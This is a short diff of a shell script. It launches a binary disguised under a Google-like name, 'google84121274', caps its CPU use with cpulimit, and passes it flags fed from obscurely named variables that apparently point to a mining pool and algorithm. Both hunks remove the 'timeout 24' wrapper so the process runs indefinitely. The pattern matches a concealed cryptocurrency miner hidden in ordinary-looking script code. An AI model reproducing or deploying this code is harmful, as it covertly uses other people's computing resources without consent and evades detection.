@@ -78,7 +78,7 @@ pkill -f cpulimit
 
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
-timeout 24 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
 
 else
 
@@ -144,7 +144,7 @@ pkill -f cpulimit
 
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
-timeout 24 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
 
 fi
 
